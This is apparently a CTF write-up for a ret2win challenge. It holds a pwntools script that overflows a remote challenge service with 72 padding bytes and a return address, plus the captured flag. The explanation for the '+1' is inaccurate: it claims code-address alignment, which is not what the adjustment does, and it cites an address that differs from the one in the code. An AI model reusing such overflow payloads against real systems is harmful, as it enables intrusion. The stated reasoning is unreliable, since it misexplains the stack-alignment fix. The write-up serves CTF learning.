![image](https://github.com/user-attachments/assets/f91b05ae-768e-4842-945e-de3e12fdd3d6)

To talk about this task, which is a classic Return-to-Win (ret2win) exploitation challenge.
Here is the solver :

```Python
#KOLLLLLL W WAKKELLLL
from pwn import *
p = remote("51.77.140.155" ,1329)
payload=b'A'*72+p64(0x40132d+1)
p.sendline(payload)
p.interactive()

```
The reason I add +1 to the address 0x00401351 in my exploit is to ensure that the address is aligned to a 16-byte boundary, which is required by the movaps instruction. Since movaps cannot work with misaligned addresses, adjusting the address ensures that the CPU can execute the instruction correctly without causing crashes or exceptions.

![image](https://github.com/user-attachments/assets/a48e364c-58b1-4890-94fb-49f72d9feca2)

FLAG : Securinets{sh3_1s_th3_FL4G}

few resources :
https://medium.com/@arjun1gu/zh3r0-ctf-ret2win-official-writeup-38ae03a6a9f6

https://ctfcookbook.com/docs/pwn/return-to-win/
